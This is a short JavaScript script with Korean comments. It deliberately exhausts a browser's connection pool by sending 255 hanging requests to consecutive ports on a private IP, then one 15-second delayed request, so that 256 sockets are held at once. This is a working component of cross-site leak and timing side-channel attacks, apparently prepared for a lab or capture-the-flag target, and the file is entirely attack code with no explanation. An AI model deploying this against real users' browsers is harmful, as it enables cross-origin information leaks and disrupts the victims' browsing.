async function blockSockets() {
    const baseURL = "http://10.10.34.168";
    const promises = [];

    // 8001~8255 포트로 255개의 /block 요청을 보냄
    for (let i = 1; i <= 255; i++) {
        const port = 8000 + i;
        const url = `${baseURL}:${port}/block`;
        promises.push(fetch(url, { mode: "no-cors", cache: "no-store" }));
    }

    // 모든 /block 요청을 동시에 보냄
    return Promise.all(promises);
}

// 단일 지연 요청을 8000번 포트로 보내는 함수
async function delayedRequest() {
    const delayedURL = "http://10.10.34.168:8000/delayed";

    try {
        const response = await fetch(delayedURL, { mode: "no-cors", cache: "no-store" });
        console.log("15초 지연된 요청이 응답되었습니다.");
        return response;
    } catch (error) {
        console.error("지연 요청 중 오류 발생:", error);
    }
}

// 전체 프로세스를 실행하는 함수
async function executeBlockingStrategy() {
    // 255개의 블락 요청을 먼저 보내어 소켓을 차단
    const blockPromise = blockSockets();

    // 마지막 하나의 소켓에 딜레이 요청을 보냄
    const delayPromise = delayedRequest();

    // 모든 요청을 동시에 실행하여 256개의 소켓을 차지
    await Promise.all([blockPromise, delayPromise]);
}

// 코드 실행
executeBlockingStrategy();
